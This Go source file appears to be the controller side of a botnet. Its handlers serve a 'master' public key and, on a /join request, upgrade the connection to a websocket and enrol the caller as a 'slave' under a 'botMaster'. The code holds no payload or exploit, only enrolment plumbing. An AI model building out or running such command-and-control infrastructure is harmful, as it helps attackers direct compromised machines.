package master

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/gorilla/websocket"
)

const (
	// KeyEndpoint is where the master public key is served
	KeyEndpoint = "/key"
	// JoinEndpoint is where new net users will register
	JoinEndpoint = "/join"
)

// KeyResponse is the response of the key endpoint
type KeyResponse struct {
	Key string `json:"key"`
}

// JoinRequest is the expected payload for the join endpoint
type JoinRequest struct {
	Key string `json:"key"`
}

func (c *Config) keyHandler(w http.ResponseWriter, r *http.Request) {
	respBytes, err := json.Marshal(&KeyResponse{Key: c.botMaster.masterPubKey})
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not return public key"))
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write(respBytes)
	return
}

func (c *Config) joinHandler(w http.ResponseWriter, r *http.Request) {
	bodyBytes, err := ioutil.ReadAll(r.Body)
	defer r.Body.Close()
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("could not read request body"))
		return
	}
	// FIXME: in the future, this request should be encrypted with the master
	// pub key and we'll have to decrypt it
	var jr JoinRequest
	if err := json.Unmarshal(bodyBytes, &jr); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte("unexpected payload"))
		return
	}
	// upgrade protocol to websockets connection
	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not upgrade to WS connection"))
		return
	}
	// create new slave
	slave, err := NewSlaveCtrl(conn, jr.Key)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		w.Write([]byte(fmt.Sprintf("could not create new slave: %s", err)))
		return
	}
	c.botMaster.EnrolSlave(slave)
}
